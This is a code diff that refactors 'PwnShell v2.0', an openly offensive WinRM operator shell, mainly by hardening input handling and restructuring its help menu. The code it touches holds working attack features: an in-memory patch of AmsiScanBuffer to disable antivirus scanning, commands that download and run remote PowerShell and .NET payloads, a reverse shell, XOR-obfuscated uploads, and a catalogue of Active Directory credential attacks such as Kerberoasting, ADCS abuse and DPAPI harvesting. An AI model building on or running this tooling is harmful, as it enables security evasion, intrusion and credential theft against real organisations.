@@ -2,12 +2,19 @@
 shell.pwnshell — PwnShell v2.0 Operator Interactive Shell
 """
 
-import os, sys, logging, time, textwrap, stat
+import os
+import sys
+import re
+import logging
+import time
+import textwrap
+import stat
+import secrets
 from pathlib import PureWindowsPath, Path
 from ipaddress import ip_address
 from base64 import b64decode
-from random import randbytes
 from datetime import datetime
+from typing import Optional, List, Dict, Any, Callable
 from Cryptodome.Hash import MD5
 
 try:
@@ -33,7 +40,7 @@ from .shares    import get_shares_ps
 from .sessions  import get_sessions_ps
 from .commands import (
     chunks, b64str, split_args, xorenc, str_b64,
-    _xor_key,
+    _xor_key, build_amsi_patch,
     new_HostWriter, import_HostWriter,
     call_XorEnc, import_XorEnc,
     _importPathFix, _new_PathFix,
@@ -48,7 +55,7 @@ from .commands import (
 )
 
 
-# ── Session data directory ────────────────────────────────────────────────────
+# ── Session data directory & History Security ─────────────────────────────────
 # [BUG-01 & NICHE-01 FIX] Enforce 0o700 permission on _PWNRM_DIR so other local
 # users cannot read command history or transcript logs containing credentials.
 _PWNRM_DIR = Path(os.environ.get("PWNRM_DIR", str(Path.home() / ".pwnrm")))
@@ -67,6 +74,49 @@ try:
             )
 except OSError:
     pass
+
+# [OPT-08] Sensitive pattern filter to prevent storing credentials in history
+HISTORY_EXCLUDE_PATTERN = re.compile(
+    r'(?:-p|-password|--password|-H|-hash|--hash|--pfx-pass|password|passwd|secret|tgskey|nt_hash)',
+    re.IGNORECASE
+)
+
+
+# ── Command Registry (OPT-03) ────────────────────────────────────────────────
+COMMAND_REGISTRY = {
+    "Core Platform Commands (v2.0)": {
+        "!session [list|switch|save|exec-all]": "Multi-session manager & jump graph",
+        "!socks [PORT|stop|status]": "In-band SOCKS5 proxy (default: 1080)",
+        "!portfwd [LPORT RHOST:RPORT|list|stop]": "Local & remote port forwarding multiplexer",
+        "!module [list|run <name>]": "Extensible module & plugin subsystem",
+        "!loot": "View organized credentials & artifacts",
+        "!opsec [stealth|balanced|aggressive|hybrid-cloud]": "Toggle execution jitter & profile",
+        "!playbook [--list|--run <name>]": "Declarative red team playbook runner",
+    },
+    "Identity & Active Directory Abuse (2026-2027 TTPs)": {
+        "!adcs [-q|--template <T>|--wsus]": "Full ADCS ESC1-ESC17+ engine (WSUS/Triage)",
+        "!kerberos [--roast|--asrep|--dmsa|--diamond]": "AES Kerberoast, AS-REP & dMSA suite",
+        "!entra [-s]": "Hybrid Entra ID / Azure AD PRT pivot",
+        "!creds [--vault|--dpapi|--history]": "Deep credential & token artifact hunter",
+        "!bloodhound [-c <methods>]": "In-memory AD graph collector (BloodHound)",
+        "!lateral [--subnet <s>]": "Subnet scout & lateral movement engine",
+    },
+    "Recon, Staging & Evasion": {
+        "!evasion [--edr|--amsi|--etw]": "Polymorphic AMSI/ETW bypass & EDR scout",
+        "!adtriage [-q]": "AD post-auth quick triage",
+        "!shares [-q] [HOST..]": "SMB share permission mapper",
+        "!sessions [-q]": "Logon sessions & network snapshot",
+        "!sysinfo": "Quick OS / AV / hotfix snapshot",
+        "!download RPATH [LPATH]": "Pull file/dir (dirs -> ZIP)",
+        "!upload [-xor] LPATH [RPATH]": "Push file (-xor for stealth)",
+        "!amsi": "Patch AmsiScanBuffer in-process (polymorphic)",
+        "!psrun [-xor] URL": "Load & exec remote PS1",
+        "!netrun [-xor] URL [ARG..]": "Load & exec remote .NET assembly",
+        "!revshell IP PORT": "Raw Winsock reverse shell",
+        "!log / !stoplog": "Toggle session transcript",
+        "exit / quit / Ctrl+D": "Close session",
+    }
+}
 
 
 class PwnShell:
@@ -118,7 +168,7 @@ class PwnShell:
     # ── logging ───────────────────────────────────────────────────────────────
     def start_log(self):
         if not self.stdout_log:
-            fn = str(_PWNRM_DIR / f"pwnrm_{int(time.time())}_{randbytes(4).hex()}_stdout.log")
+            fn = str(_PWNRM_DIR / f"pwnrm_{int(time.time())}_{secrets.token_hex(4)}_stdout.log")
             self.write_info(f"Logging to {c(C, fn)}")
             flags = os.O_CREAT | os.O_EXCL | os.O_WRONLY | os.O_APPEND
             fd = os.open(fn, flags, 0o600)
@@ -129,7 +179,7 @@ class PwnShell:
             self.stdout_log.close()
             self.stdout_log = None
 
-    # ── help / banner ─────────────────────────────────────────────────────────
+    # ── help / banner (OPT-03) ────────────────────────────────────────────────
     def help(self):
         elapsed = str(datetime.now() - self.start_time).split(".")[0]
         tgt = self.target_info.get("host","?")
@@ -142,40 +192,13 @@ class PwnShell:
           Target  : {c(C,tgt)}    User: {c(G,usr)}
           Elapsed : {elapsed}    Commands: {self.cmd_count}    OPSEC: {c(Y, self.opsec_profile.mode.upper())}
           SOCKS5  : {c(M, socks_status)}
-
-        {BLD}  Core Platform Commands (v2.0){RST}
-          {c(Y,'!session')} [list|switch|kill|rename|save|exec-all]   Multi-session manager & jump graph
-          {c(Y,'!socks')} [PORT|stop|status]                          In-band SOCKS5 proxy (default: 1080)
-          {c(Y,'!portfwd')} [LPORT RHOST:RPORT|list|stop]             Local & remote port forwarding multiplexer
-          {c(Y,'!module')} [list|run <name>]                          Extensible module & plugin subsystem
-          {c(Y,'!loot')}                                              View organized credentials & artifacts
-          {c(Y,'!opsec')} [stealth|balanced|aggressive|hybrid-cloud]  Toggle execution jitter & profile
-          {c(Y,'!playbook')} [--list|--run <name>]                    Declarative red team playbook runner
-
-        {BLD}  Identity & Active Directory Abuse (2026-2027 TTPs){RST}
-          {c(Y,'!adcs')} [-q|--template <T>|--wsus]                  Full ADCS ESC1-ESC17+ engine (WSUS/Triage)
-          {c(Y,'!kerberos')} [--roast|--asrep|--dmsa|--diamond]      AES Kerberoast, AS-REP & dMSA suite
-          {c(Y,'!entra')} [-s]                                       Hybrid Entra ID / Azure AD PRT pivot
-          {c(Y,'!creds')} [--vault|--dpapi|--history]                Deep credential & token artifact hunter
-          {c(Y,'!bloodhound')} [-c <methods>]                        In-memory AD graph collector (BloodHound)
-          {c(Y,'!lateral')} [--subnet <s>]                           Subnet scout & lateral movement engine
-
-        {BLD}  Recon, Staging & Evasion{RST}
-          {c(Y,'!evasion')} [--edr|--amsi|--etw]                     Polymorphic AMSI/ETW bypass & EDR scout
-          {c(Y,'!adtriage')} [-q]                                    AD post-auth quick triage
-          {c(Y,'!shares')} [-q] [HOST..]                             SMB share permission mapper
-          {c(Y,'!sessions')} [-q]                                    Logon sessions & network snapshot
-          {c(Y,'!sysinfo')}                                          Quick OS / AV / hotfix snapshot
-          {c(Y,'!download')} RPATH [LPATH]                           Pull file/dir (dirs -> ZIP)
-          {c(Y,'!upload')} [-xor] LPATH [RPATH]                      Push file (-xor for stealth)
-          {c(Y,'!amsi')}                                             Patch AmsiScanBuffer in-process
-          {c(Y,'!psrun')} [-xor] URL                                 Load & exec remote PS1
-          {c(Y,'!netrun')} [-xor] URL [ARG..]                        Load & exec remote .NET assembly
-          {c(Y,'!revshell')} IP PORT                                 Raw Winsock reverse shell
-
-          {c(Y,'!log')} / {c(Y,'!stoplog')}                                  Toggle session transcript
-          exit / quit / Ctrl+D                                       Close session
         """))
+
+        for section, cmds in COMMAND_REGISTRY.items():
+            print(f"  {BLD}{section}{RST}")
+            for cmd_syntax, desc in cmds.items():
+                print(f"    {c(Y, cmd_syntax):<45} {desc}")
+            print()
 
     # ── REPL ──────────────────────────────────────────────────────────────────
     def repl(self, inputs=None):
@@ -235,7 +258,8 @@ class PwnShell:
                     self.help()
                 else:
                     if self.stdout_log:
-                        self.stdout_log.write(f"PS {self.cwd}> {cmd}\n".encode())
+                        clean_cmd = strip_ansi(cmd)
+                        self.stdout_log.write(f"PS {self.cwd}> {clean_cmd}\n".encode())
                         self.stdout_log.flush()
                     self.run_with_interrupt(cmd, self.write_line)
                     self.update_cwd()
@@ -263,11 +287,11 @@ class PwnShell:
             else:
                 yield cmd
 
-    # ── output handlers ───────────────────────────────────────────────────────
+    # ── output handlers (OPT-04) ──────────────────────────────────────────────
     def _clear(self):
         return "\033[2K\r" if self.need_clear else ""
 
-    def write_line(self, out):
+    def write_line(self, out: dict):
         clr = self._clear(); self.need_clear = False
         log = b""
         if "stdout" in out:
@@ -288,48 +312,55 @@ class PwnShell:
             print(clr + c(B, "  [~] " + strip_ansi(out["progress"])), end="\r", flush=True)
             self.need_clear = True
         if self.stdout_log and log:
-            self.stdout_log.write(log); self.stdout_log.flush()
+            # [OPT-04] Guarantee no ANSI color codes are ever written to stdout_log
+            self.stdout_log.write(strip_ansi(log.decode("utf-8", errors="replace")).encode("utf-8"))
+            self.stdout_log.flush()
 
-    def write_info(self, msg):    self.write_line({"info": msg, "endl": "\n"})
-    def write_warning(self, msg): self.write_line({"warn": msg})
-    def write_error(self, msg):   self.write_line({"error": msg})
-    def write_progress(self, msg):self.write_line({"progress": msg})
+    def write_info(self, msg: str):    self.write_line({"info": msg, "endl": "\n"})
+    def write_warning(self, msg: str): self.write_line({"warn": msg})
+    def write_error(self, msg: str):   self.write_line({"error": msg})
+    def write_progress(self, msg: str):self.write_line({"progress": msg})
 
-    def run_sync(self, cmd, max_bytes=1048576):  # [HIGH-05 FIX] 1MB cap for sync commands to prevent OOM
+    # ── Synchronous & Interruptible execution (FIX-08, OPT-01) ────────────────
+    MAX_SYNC_BYTES = 1 * 1024 * 1024  # 1 MB [HIGH-05 / FIX-08]
+
+    def run_sync(self, cmd: str, max_bytes: int = MAX_SYNC_BYTES) -> str:
         out = []
         total = 0
         for o in self.runspace.run_command(cmd):
             if "stdout" in o:
                 chunk = o["stdout"]
-                if total + len(chunk) > max_bytes:
+                total += len(chunk)
+                if total > max_bytes:
                     out.append("\n[!] run_sync output truncated (exceeded max_bytes protection).")
+                    self.write_warning(f"run_sync: output exceeded {max_bytes} bytes, truncated")
                     self.runspace.interrupt()
                     break
                 out.append(chunk)
-                total += len(chunk)
         return "\n".join(out)
 
-    def run_with_interrupt(self, cmd, handler=None, exc_handler=None):
+    def run_with_interrupt(self, cmd: str, handler: Optional[Callable] = None, exc_handler: Optional[Callable] = None) -> bool:
+        # [OPT-01 FIX] Hold CtrlCHandler across the entire stream iteration to eliminate race window
         stream = self.runspace.run_command(cmd)
-        while True:
-            with CtrlCHandler(timeout=5) as h:
+        with CtrlCHandler(timeout=5) as h:
+            for out in stream:
+                if h.interrupted:
+                    self.runspace.interrupt()
+                    return True
                 try:
-                    out = next(stream)
-                except StopIteration:
-                    break
+                    if handler:
+                        handler(out)
                 except Exception as e:
                     if exc_handler and exc_handler(e):
                         continue
                     raise
-                if handler:
-                    handler(out)
             if h.interrupted:
                 self.runspace.interrupt()
                 return True
         return False
 
     # ══════════════════════════════════════════════════════════════════════════
-    #  DISPATCHERS FOR NEW V2.0 PLATFORM SUBSYSTEMS
+    #  DISPATCHERS FOR V2.0 PLATFORM SUBSYSTEMS
     # ══════════════════════════════════════════════════════════════════════════
 
     def _session_dispatch(self, args_str: str):
@@ -529,25 +560,24 @@ class PwnShell:
         for c_ in cmds:
             self.run_with_interrupt(c_, self.write_line)
 
-    # ── !amsi ─────────────────────────────────────────────────────────────────
+    # ── !amsi (FIX-04) ────────────────────────────────────────────────────────
     def amsi_bypass(self):
+        amsi_arr, amsi_len, amsi_offset = build_amsi_patch()
         cmds = [
             _import_LoadLibrary, _import_GetProcAddress, _import_VirtualProtect,
             f"$addr = {_call_GetProcAddress}({_call_LoadLibrary}({str_b64('amsi.dll')}), {str_b64('AmsiScanBuffer')})",
-            f"$old = [uint32]0; {_call_VirtualProtect}($addr, [IntPtr]6, [uint32]64, [ref]$old)",
-            "Start-Sleep -Seconds 1",
-            "[Runtime.InteropServices.Marshal]::Copy([byte[]](0xb8,0x57,0,7,0x80,0xc3), 0, $addr, 6)",
-            "Start-Sleep -Seconds 1",
-            f"$old = [uint32]0; {_call_VirtualProtect}($addr, [IntPtr]6, [uint32]32, [ref]$old)",
+            f"$old = [uint32]0; {_call_VirtualProtect}($addr, [IntPtr]{amsi_len}, [uint32]64, [ref]$old)",
+            f"[Runtime.InteropServices.Marshal]::Copy([byte[]]({amsi_arr}), 0, $addr, {amsi_len})",
+            f"{_call_VirtualProtect}($addr, [IntPtr]{amsi_len}, [uint32]32, [ref]$old)",
         ]
-        self.write_info(c(Y, "  [*] Patching AmsiScanBuffer..."))
+        self.write_info(c(Y, "  [*] Applying polymorphic in-memory AMSI patch..."))
         for cmd in cmds:
             logging.debug(cmd)
             self.run_with_interrupt(cmd, self.write_line)
-        self.write_info(c(G, "  [+] AMSI bypass applied."))
+        self.write_info(c(G, "  [+] AMSI bypass applied successfully."))
 
     # ── !psrun ────────────────────────────────────────────────────────────────
-    def psrun(self, cmdline):
+    def psrun(self, cmdline: str):
         args   = split_args(cmdline)[:2]
         if not args:
             self.write_warning("usage: !psrun [-xor] URL"); return
@@ -573,7 +603,7 @@ class PwnShell:
             logging.debug(cmd); self.run_with_interrupt(cmd, self.write_line)
 
     # ── !netrun ───────────────────────────────────────────────────────────────
-    def netrun(self, cmdline):
+    def netrun(self, cmdline: str):
         args = split_args(cmdline)
         if not args:
             self.write_warning("usage: !netrun [-xor] URL [ARG..]"); return
@@ -604,7 +634,7 @@ class PwnShell:
             logging.debug(cmd); self.run_with_interrupt(cmd, self.write_line)
 
     # ── !revshell ─────────────────────────────────────────────────────────────
-    def revshell(self, cmdline):
+    def revshell(self, cmdline: str):
         args = split_args(cmdline)
         try:
             ip   = ip_address(args[0]).packed
@@ -627,8 +657,8 @@ class PwnShell:
         for cmd in cmds:
             logging.debug(cmd); self.run_with_interrupt(cmd, self.write_line)
 
-    # ── !upload ───────────────────────────────────────────────────────────────
-    def upload(self, cmdline):
+    # ── !upload (FIX-02, OPT-02) ──────────────────────────────────────────────
+    def upload(self, cmdline: str):
         args = split_args(cmdline)
         if not args:
             self.write_warning("usage: !upload [-xor] LPATH [RPATH]"); return
@@ -641,31 +671,39 @@ class PwnShell:
         src = Path(args[0])
         dst = PureWindowsPath(args[1] if len(args) == 2 else src.name)
         try:
-            with open(src,"rb") as f: buf = f.read()
+            with open(src, "rb") as f: buf = f.read()
         except IOError as e:
             self.write_error(str(e)); return
 
-        temp_raw = self.run_sync("[IO.Path]::GetTempPath()").strip()
+        temp_raw = self.run_sync("[System.IO.Path]::GetTempPath()").strip()
         try:
             temp_validated = self._validate_remote_path(temp_raw)
         except ValueError:
             temp_validated = "C:\\Windows\\Temp\\"
-        tmpfn = self._pse(temp_validated) + randbytes(8).hex() + ".tmp"
+        tmpfn = temp_validated + secrets.token_hex(8) + ".tmp"
+        tmpfn_pde = self._pde(tmpfn)
+        dst_pde = self._pde(dst)
+
         total = 0
-        self.write_info(f"  [~] Uploading -> {c(C,str(tmpfn))}")
+        self.write_info(f"  [~] Uploading -> {c(C, str(tmpfn))}")
         self.run_sync(import_XorEnc)
         for chunk in chunks(buf, 65536):
-            total += len(chunk)
+            chunk_len = len(chunk)
+            pct = int((total + chunk_len) * 100 // len(buf)) if len(buf) > 0 else 100
+            self.write_progress(f"Upload {total + chunk_len}/{len(buf)} bytes ({pct}%)")
             chunk_b64 = f"[Convert]::FromBase64String('{b64str(xorenc(chunk, _xor_key))}')"
             xorfunc   = call_XorEnc if unxor else ""
-            cmd = f"Add-Content -Encoding Byte '{tmpfn}' ([byte[]]$({xorfunc}({chunk_b64})))"
+            # [FIX-02] Use double-quoted strings with _pde escaping and -LiteralPath
+            cmd = f'Add-Content -LiteralPath "{tmpfn_pde}" -Encoding Byte ([byte[]]$({xorfunc}({chunk_b64})))'
             if self.run_with_interrupt(cmd):
-                self.write_warning("Upload interrupted"); self.run_sync(f"Remove-Item -Force '{tmpfn}'"); return
-            self.write_progress(f"Upload {total}/{len(buf)} bytes")
-        self.write_info(f"  [~] Moving to {c(C,str(dst))}")
-        dst_ps = self._pse(dst)
-        self.run_with_interrupt(f"Move-Item -Force -Path '{tmpfn}' -Destination '{dst_ps}'", self.write_line)
-        h = self.run_sync(f"(Get-FileHash '{dst_ps}' -Algorithm MD5).Hash")
+                self.write_warning("Upload interrupted")
+                self.run_sync(f'Remove-Item -Force -LiteralPath "{tmpfn_pde}"')
+                return
+            total += chunk_len
+
+        self.write_info(f"  [~] Moving to {c(C, str(dst))}")
+        self.run_with_interrupt(f'Move-Item -Force -LiteralPath "{tmpfn_pde}" -Destination "{dst_pde}"', self.write_line)
+        h = self.run_sync(f'(Get-FileHash -LiteralPath "{dst_pde}" -Algorithm MD5).Hash')
         ok = MD5.new(buf if unxor else xorenc(buf, _xor_key)).hexdigest().upper()
         if h.strip() != ok:
             self.write_error("  Upload integrity check FAILED — file may be corrupted!")
@@ -673,12 +711,12 @@ class PwnShell:
             self.write_info(c(G, "  [+] Upload complete — MD5 verified."))
 
     @staticmethod
-    def _pse(path) -> str:
+    def _pse(path: Any) -> str:
         """Escape single quotes for safe PS single-quoted string embedding."""
         return str(path).replace("'", "''")
 
     @staticmethod
-    def _pde(path) -> str:
+    def _pde(path: Any) -> str:
         """
         Escape a path for embedding inside a PowerShell double-quoted string.
         Escapes: backtick (must be first), dollar sign, double-quote.
@@ -689,32 +727,36 @@ class PwnShell:
         s = s.replace('"', '`"')
         return s
 
-    # ── safe Windows path validator ───────────────────────────────────────────
-    import re as _re
-    _SAFE_WIN_PATH_RE = _re.compile(
-        r'^(?:[A-Za-z]:|\\\\[a-zA-Z0-9_.-]+\\[a-zA-Z0-9_.-]+)[\\\/][^\x00-\x1f"$`|&;<>{}()]*$'
-    )
+    # ── safe Windows path validator (FIX-07) ───────────────────────────────────
+    _SAFE_WINPATH = re.compile(r'^[A-Za-z]:\\(?:[^<>:"/\\|?*\x00-\x1f$`;&{}()]+\\)*[^<>:"/\\|?*\x00-\x1f$`;&{}()]*$')
+    _SAFE_UNCPATH = re.compile(r'^\\\\[^<>:"/\\|?*\x00-\x1f$`;&{}()]+\\[^<>:"/\\|?*\x00-\x1f$`;&{}()].*$')
 
     @classmethod
     def _validate_remote_path(cls, path: str) -> str:
+        """Return validated path if it looks like a legitimate Windows absolute path."""
+        if not path or len(path) > 32767:
+            raise ValueError("Remote path is empty or exceeds maximum path length.")
         stripped = path.strip()
-        if not cls._SAFE_WIN_PATH_RE.match(stripped):
+        if ".." in stripped:
+            raise ValueError(
+                f"Remote path contains directory traversal sequences: {stripped!r}"
+            )
+        if not (cls._SAFE_WINPATH.match(stripped) or cls._SAFE_UNCPATH.match(stripped)):
             raise ValueError(
                 f"Remote path failed safety validation: {stripped!r}\n"
-                "  The WinRM server returned a path containing unsafe characters."
+                "  The WinRM server returned a path containing unsafe or injection characters."
             )
         return stripped
 
-    # ── !download ─────────────────────────────────────────────────────────────
-    def download(self, cmdline):
+    # ── !download (FIX-01, FIX-03, FIX-07, OPT-07) ────────────────────────────
+    def download(self, cmdline: str):
         args = split_args(cmdline)
         if not args or len(args) > 2:
             self.write_warning("usage: !download RPATH [LPATH]"); return
 
+        # [FIX-03] Always derive default local filename from user-supplied RPATH
         user_rpath = PureWindowsPath(args[0])
-        safe_filename = user_rpath.name
-        if not safe_filename:
-            safe_filename = "downloaded_file"
+        safe_filename = user_rpath.name or "downloaded_file"
 
         src_raw = self.run_sync(f"Resolve-Path -LiteralPath '{self._pse(args[0])}' | Select -Expand Path")
         if not src_raw:
@@ -732,14 +774,19 @@ class PwnShell:
         dst = Path(args[1]) if len(args) == 2 else Path(safe_filename)
         if dst.is_dir(): 
             dst = dst / safe_filename
-            
-        if '..' in dst.name:
-            self.write_error("Invalid characters ('..') in destination filename."); return
+
+        dst_resolved = dst.resolve()
+        cwd_resolved = Path.cwd().resolve()
+
+        # Path traversal guard for relative local paths
+        if len(args) < 2 and not str(dst_resolved).startswith(str(cwd_resolved)):
+            self.write_error(f"Refusing path outside CWD: {dst_resolved}")
+            return
 
         if not dst.parent.exists(): 
             os.makedirs(dst.parent, exist_ok=True)
 
-        is_dir = self.run_sync(f"Test-Path -Path '{src_ps}' -PathType Container") == "True"
+        is_dir = self.run_sync(f"Test-Path -LiteralPath '{src_ps}' -PathType Container") == "True"
         if is_dir:
             if not dst.name.lower().endswith(".zip"): 
                 dst = dst.parent / f"{dst.name}.zip"
@@ -749,32 +796,35 @@ class PwnShell:
                 tmpdir_validated = self._validate_remote_path(tmpdir_raw)
             except ValueError:
                 tmpdir_validated = "C:\\Windows\\Temp\\"
-            tmpdir    = self._pse(tmpdir_validated)
-            tmpnm     = randbytes(8).hex()
+            tmpdir    = tmpdir_validated
+            tmpnm     = secrets.token_hex(8)
             tmpfn     = tmpdir + tmpnm
-            tmpfn_pde = self._pde(tmpdir + tmpnm)
+            tmpdir_ps = self._pse(tmpdir)
+            tmpfn_ps  = self._pse(tmpfn)
+            tmpfn_pde = self._pde(tmpfn)
+
             ps = f"""
 Add-Type -AssemblyName "System.IO.Compression.FileSystem"
-New-Item -Path '{tmpdir}' -ItemType Directory -Name '{tmpnm}' | Out-Null
-Get-ChildItem -Force -Recurse -Path '{src_ps}' | ForEach-Object {{
+New-Item -Path '{tmpdir_ps}' -ItemType Directory -Name '{tmpnm}' | Out-Null
+Get-ChildItem -Force -Recurse -LiteralPath '{src_ps}' | ForEach-Object {{
     if(-not ($_.FullName -Like "*{tmpnm}*")) {{
         try {{
             $d = $_.FullName.Replace('{src_ps}', '')
-            Copy-Item -ErrorAction SilentlyContinue -Force $_.FullName "{tmpfn_pde}\\$d"
+            Copy-Item -ErrorAction SilentlyContinue -Force -LiteralPath $_.FullName "{tmpfn_pde}\\$d"
         }} catch {{ Write-Warning "skipping $d" }}
     }}
 }}
 {_importPathFix}
-[IO.Compression.ZipFile]::CreateFromDirectory('{tmpfn}', '{tmpfn}.zip',
+[IO.Compression.ZipFile]::CreateFromDirectory('{tmpfn_ps}', '{tmpfn_ps}.zip',
     [IO.Compression.CompressionLevel]::Fastest, $true, ${_new_PathFix})
-Remove-Item -Recurse -Force -Path '{tmpfn}'
+Remove-Item -Recurse -Force -LiteralPath '{tmpfn_ps}'
 """
             self.run_with_interrupt(ps, self.write_line)
             src    = tmpfn + ".zip"
             src_ps = self._pse(src)
 
         ps = f"""function Download-Remote {{
-    $h = Get-FileHash '{src_ps}' -Algorithm MD5 | Select -Expand Hash;
+    $h = Get-FileHash -LiteralPath '{src_ps}' -Algorithm MD5 | Select -Expand Hash;
     $f = [System.IO.File]::OpenRead('{src_ps}');
     $b = New-Object byte[] 65536;
     while(($n = $f.Read($b, 0, 65536)) -gt 0) {{ [Convert]::ToBase64String($b, 0, $n) }};
@@ -794,7 +844,7 @@ Remove-Item Function:Download-Remote
                     chunk = b64decode(part)
                     if len(buf) + len(chunk) > max_bytes:
                         raise RuntimeError(f"OOM guard: stream exceeds {max_bytes} bytes")
-                    buf.extend(chunk)
+                    buf.extend(chunk)  # [FIX-01] in-place accumulation on shared bytearray
                     self.write_progress(f"Download {len(buf)} bytes")
                 except RuntimeError as e:
                     self.write_error(str(e))
@@ -804,15 +854,26 @@ Remove-Item Function:Download-Remote
 
         self.run_with_interrupt(ps, collect)
 
-        if is_dir: self.run_sync(f"Remove-Item -fo '{src_ps}'")
+        if is_dir: self.run_sync(f"Remove-Item -Force -LiteralPath '{src_ps}'")
+
+        if len(buf) == 0:
+            self.write_error(
+                "  Download failed: no data received from server "
+                "(empty stream or collection failure)."
+            )
+            return
+
         if len(buf) < 32:
             self.write_error(
                 f"  Download failed: server returned {len(buf)} bytes "
                 "(expected at least 32-byte MD5 trailer)."
             )
             return
-        if buf[-32:] != MD5.new(buf[:-32]).hexdigest().upper().encode():
-            self.write_error("  Download integrity check FAILED!")
+
+        expected_md5 = MD5.new(buf[:-32]).hexdigest().upper().encode()
+        if buf[-32:] != expected_md5:
+            buf[:] = b'\x00' * len(buf)  # [OPT-07] zeroize sensitive buffer in memory
+            self.write_error("  Download integrity check FAILED — file corrupted or tampered!")
             return
             
         self.write_info(f"  [+] Writing {c(G,str(dst.resolve()))}")
